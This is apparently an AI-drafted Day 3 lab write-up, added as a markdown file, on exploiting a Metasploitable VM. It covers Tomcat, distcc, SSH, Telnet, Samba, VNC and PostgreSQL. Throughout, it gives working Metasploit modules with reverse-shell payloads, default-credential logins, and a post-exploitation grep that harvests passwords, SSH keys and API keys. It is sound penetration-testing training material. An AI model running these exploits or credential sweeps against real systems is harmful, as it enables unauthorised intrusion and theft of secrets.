@@ -1,0 +1,268 @@
+Day 3 — Complete Exploitation & Documentation (Tomcat, distcc, SSH, Telnet, Samba, VNC, PostgreSQL)
+
+Great — you finished Day 3. Below is a polished, repo-ready Day 3 report you can copy into your GitHub README or a /notes/day3.md file. It follows the same format as Day 1/2: Setup → Recon → Per-service Exploits → Post-exploitation → Lessons → Artifacts & Commit suggestions.
+
+Day 3 — Summary
+
+Objective: Complete practical exploitation for remaining services listed in day1-plan.txt and capture logs/results for documentation.
+Outcome: Completed exploitation of Tomcat, distcc, SSH, Telnet, Samba/SMB, VNC and PostgreSQL. Validated vulnerabilities and saved all relevant outputs to the lab folders.
+
+1) Lab Setup & Context
+
+Working folders on Kali:
+
+~/labs/metasploitable/{scans,exploits,results,}
+
+
+Target: <TARGET-IP> (example 192.168.56.102)
+
+Attacker (Kali) IP used as LHOST: <KALI-IP> (example 192.168.56.10)
+
+Snapshots: revert to clean-import or boot-verified before each risky exploit.
+
+2) Recon (commands used & saved outputs)
+
+Saved recon outputs in scans/:
+
+# Tomcat / web
+sudo nmap -sV -p80,8080,8180 --script http-title -Pn <TARGET> -oN scans/tomcat-nmap.txt
+
+# distcc
+sudo nmap -sS -sV -p3632 --script distcc* -Pn <TARGET> -oN scans/distcc-nse.txt
+
+# SSH
+sudo nmap -sS -sV -p22 -Pn <TARGET> -oN scans/ssh-nmap.txt
+
+# Telnet
+sudo nmap -sS -sV -p23 -Pn <TARGET> -oN scans/telnet-nmap.txt
+
+# SMB
+sudo nmap -sV -p139,445 --script smb* -Pn <TARGET> -oN scans/smb-nmap.txt
+
+# VNC
+sudo nmap -sV -p5900 --script=vnc-info -Pn <TARGET> -oN scans/vnc-nmap.txt
+
+# PostgreSQL
+sudo nmap -sV -p5432 -Pn <TARGET> -oN scans/pg-nmap.txt
+
+
+Verify saved files with ls -lh scans/ and review with less where needed.
+
+3) Per-service Exploitation (what you ran, what you saved)
+
+For every service you saved: scans → scans/, msfconsole spools → exploits/, post results → results/.
+
+Apache Tomcat (8180 — manager)
+
+Goal: deploy WAR via Tomcat manager (default tomcat:tomcat).
+
+Commands / steps used:
+
+# enumerate and headers
+curl -I http://<TARGET>:8180/ > scans/tomcat-headers.txt
+curl -I -u tomcat:tomcat http://<TARGET>:8180/manager/html > scans/tomcat-manager.txt
+
+# dir discovery
+gobuster dir -u http://<TARGET>:8180 -w /usr/share/wordlists/dirb/common.txt -o scans/tomcat-gobuster.txt
+
+# Metasploit deploy
+msfconsole
+spool exploits/tomcat-session.txt
+use exploit/multi/http/tomcat_mgr_deploy
+set RHOSTS <TARGET>
+set RPORT 8180
+set HttpUsername tomcat
+set HttpPassword tomcat
+set PAYLOAD java/meterpreter/reverse_tcp
+set LHOST <KALI>
+set LPORT 4444
+exploit
+spool off
+
+
+Post-exploit capture:
+
+Ran the meterpreter-exec one-liner to create /tmp/tomcat-post.txt and downloaded it:
+
+# executed on meterpreter
+execute -f /bin/sh -a "-c 'whoami; echo; id; echo; uname -a; echo; cat /etc/issue 2>/dev/null || true; echo; pwd; echo; ls -la /; echo; ps aux | head -n 30; echo; ss -tulpen 2>/dev/null || netstat -tulpen 2>/dev/null; echo; sudo -l 2>/dev/null || echo \"no_sudo\"; echo; find / -perm -4000 -type f 2>/dev/null | head -n 40' " -H
+# download
+download /tmp/tomcat-post.txt /home/$(whoami)/labs/metasploitable/results/tomcat-post.txt
+
+
+Files saved:
+
+exploits/tomcat-session.txt (msf spool)
+
+results/tomcat-post.txt
+
+distcc (3632)
+
+Goal: RCE PoC via distcc.
+
+Commands / steps used:
+
+# Recon + banner
+sudo nmap -sS -sV -p3632 -Pn <TARGET> -oN scans/distcc-nmap.txt
+sudo nmap -sV -p3632 --script distcc* -Pn <TARGET> -oN scans/distcc-nse.txt
+
+# quick probe
+printf "\n" | nc -v -w 3 <TARGET> 3632 2>&1 | tee scans/distcc-banner.txt
+echo "version" | ncat <TARGET> 3632 2>&1 | tee scans/distcc-ncat-probe.txt
+
+# Metasploit exploit
+msfconsole
+spool exploits/distcc-session.txt
+use exploit/unix/misc/distcc_exec
+set RHOSTS <TARGET>
+set RPORT 3632
+set PAYLOAD cmd/unix/reverse
+set LHOST <KALI>
+set LPORT 4444
+exploit
+spool off
+
+
+Post-exploit capture: saved to results/distcc-post.txt (standard whoami/id/uname/etc collection).
+
+Files saved:
+
+scans/distcc-nse.txt, scans/distcc-banner.txt
+
+exploits/distcc-session.txt
+
+results/distcc-post.txt
+
+SSH (22)
+
+Goal: access via default creds and test workarounds for host-key algorithms.
+
+Commands / steps used:
+
+# banner & verbose attempt
+ssh -o BatchMode=yes -o ConnectTimeout=8 -vvv msfadmin@<TARGET> 2>&1 | tee exploits/ssh-verbose-banner.txt || true
+
+# force rsa / force password attempts (if needed)
+ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedKeyTypes=+ssh-rsa msfadmin@<TARGET> 2>&1 | tee exploits/ssh-force-rsa-try.txt || true
+ssh -o PubkeyAuthentication=no -o HostKeyAlgorithms=+ssh-rsa msfadmin@<TARGET> 2>&1 | tee exploits/ssh-force-pass-try.txt || true
+
+# non-interactive using sshpass
+sudo apt update && sudo apt install -y sshpass
+sshpass -p 'msfadmin' ssh -o StrictHostKeyChecking=no -o HostKeyAlgorithms=+ssh-rsa msfadmin@<TARGET> 'whoami; id' 2>&1 | tee exploits/ssh-sshpass-msfadmin.txt || true
+
+
+Result: Remote login using default credentials succeeded; saved the session outputs.
+Files saved: exploits/ssh-sshpass-msfadmin.txt, exploits/ssh-verbose-banner.txt.
+
+Telnet (23)
+
+Goal: connect with plaintext creds and capture session.
+
+Commands / steps used:
+
+sudo nmap -sS -sV -p23 -Pn <TARGET> -oN scans/telnet-nmap.txt
+nc -v -w 5 <TARGET> 23 2>&1 | tee scans/telnet-banner.txt || true
+telnet <TARGET> 23 | tee exploits/telnet-session.txt
+# login: msfadmin / msfadmin
+
+
+Post-exploit: ran enumeration commands and saved to results/telnet-post.txt.
+Files saved: exploits/telnet-session.txt, results/telnet-post.txt.
+
+Samba / SMB (139,445)
+
+Goal: enumerate shares, find writable share, exploit usermap_script if available.
+
+Commands / steps used:
+
+sudo nmap -sV -p139,445 --script smb* -Pn <TARGET> -oN scans/smb-nmap.txt
+enum4linux -a <TARGET> | tee scans/enum4linux-all.txt
+smbclient -L //<TARGET> -N | tee scans/smbclient-list-anon.txt
+smbclient -L //<TARGET> -U msfadmin%msfadmin | tee scans/smbclient-list-msfadmin.txt
+smbmap -H <TARGET> | tee scans/smbmap.txt
+
+
+Exploit (if usermap_script present):
+
+msfconsole
+spool exploits/smb-session.txt
+use exploit/multi/samba/usermap_script
+set RHOSTS <TARGET>
+set RPORT 445
+set LHOST <KALI>
+set LPORT 4444
+set PAYLOAD cmd/unix/reverse_socat_tcp
+exploit
+spool off
+
+
+Post-exploit capture: collected results/smb-post-*.txt including smb-conf, smbstatus, smb-passwd, smb-sudo, smb-suid.
+Files saved: scans/enum4linux-all.txt, exploits/smb-session.txt, results/smb-post-identity.txt, etc.
+
+VNC (5900)
+
+Goal: connect via weak password and capture GUI evidence.
+
+Commands / steps used:
+
+sudo nmap -sV -p5900 --script=vnc-info -Pn <TARGET> -oN scans/vnc-nmap.txt
+printf '\n' | nc -v -w 3 <TARGET> 5900 2>&1 | tee scans/vnc-nc-banner.txt || true
+
+# GUI attempt
+vncviewer <TARGET>:5900 | tee exploits/vnc-session.txt
+# tried password: "password" or blank
+
+
+Evidence: saved screenshots (if any) to screenshots/ and results/vnc-post-notes.txt.
+Files saved: exploits/vnc-session.txt, results/vnc-post-homelist.txt, screenshots/….
+
+PostgreSQL (5432)
+
+Goal: test weak DB credentials and capture DB info.
+
+Commands / steps used:
+
+sudo nmap -sV -p5432 -Pn <TARGET> -oN scans/pg-nmap.txt
+nc -v -w 3 <TARGET> 5432 2>&1 | tee scans/pg-banner.txt || true
+
+# check with psql (if credentials)
+psql -h <TARGET> -U postgres -W -c "select current_user, inet_client_addr(), version();" | tee exploits/postgres-conn.txt || true
+
+# Metasploit module (optional)
+msfconsole
+spool exploits/postgres-session.txt
+use exploit/linux/postgres/postgres_payload
+set RHOSTS <TARGET>
+set RPORT 5432
+set LHOST <KALI>
+set LPORT 4444
+exploit
+spool off
+
+
+Post-exploit capture: results/postgres-post-identity.txt, results/postgres-db-roles.txt.
+Files saved: scans/pg-nmap.txt, exploits/postgres-session.txt, results/postgres-post-identity.txt.
+
+4) Post-Exploitation — Common Commands Used
+
+Standard enumeration commands used after each shell/session; outputs saved under results/:
+
+whoami; id; hostname; uname -a
+cat /etc/issue 2>/dev/null || true
+pwd; ls -la /
+ps aux | head -n 30
+ss -tulpen 2>/dev/null || netstat -tulpen 2>/dev/null
+sudo -l 2>/dev/null || echo "no_sudo"
+find / -perm -4000 -type f 2>/dev/null | head -n 40
+crontab -l 2>/dev/null || true
+grep -R --binary-files=without-match -i "password\\|passwd\\|secret\\|ssh-rsa\\|private key\\|API_KEY" /home /var/www /etc 2>/dev/null | tee results/possible-credentials.txt || true
+
+5) Lessons Learned (Day 3)
+
+Completed exploitation coverage for core Metasploitable services — good end-to-end practice.
+
+Practiced different exploitation styles: manager deploy (Tomcat), NSE discovery + distcc RCE, credential login (SSH/Telnet/Postgres/VNC), and SMB enumeration & module exploitation.
+
+Reinforced documentation discipline: always spool msfconsole outputs, save scan files, and store post-exploit outputs in results/.
+
+Practiced safe lab hygiene: snapshots before/after, host-only network, no persistence beyond the snapshot.
